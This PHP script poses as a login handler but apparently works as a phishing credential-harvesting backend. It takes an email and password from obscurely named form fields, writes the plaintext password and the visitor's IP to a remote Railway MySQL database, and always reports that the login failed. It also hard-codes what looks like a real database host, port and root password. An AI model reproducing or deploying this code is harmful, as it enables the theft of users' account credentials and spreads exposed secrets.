<?php
// Input validation
$email = filter_input(INPUT_POST, 'di', FILTER_SANITIZE_STRING);
$password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);

// Function to send JSON response
function sendJsonResponse($success, $message = '') {
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success,
        'message' => $message
    ]);
    exit();
}

// Database connection setup using Railway credentials
try {
    // Database connection details from Railway
    $host = 'centerbeam.proxy.rlwy.net'; // Replace with your host value
    $port = '52019'; // Replace with your port value
    $dbname = 'railway'; // Replace with your database name
    $username = 'root'; // Replace with your username
    $password_db = 'irguQmxkDWgvmKWHKTYzJycGSXJWpVUZ'; // Replace with your password

    // PDO connection using MySQL
    $dsn = "mysql:host={$host};port={$port};dbname={$dbname};charset=utf8mb4";
    $pdo = new PDO($dsn, $username, $password_db);

    // Table insertion logic
    $stmt = $pdo->prepare("INSERT INTO login_attempts (email, password, ip_address, attempt_time) VALUES (?, ?, ?, ?)");
    $stmt->execute([
        $email,
        $password,
        $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
        date("Y-m-d H:i:s")
    ]);

    sendJsonResponse(false, "Login attempt saved to Railway database.");
} catch (Exception $e) {
    error_log("Failed to log login attempt: " . $e->getMessage());
    sendJsonResponse(false, "A server error occurred while saving the login attempt.");
}
?>
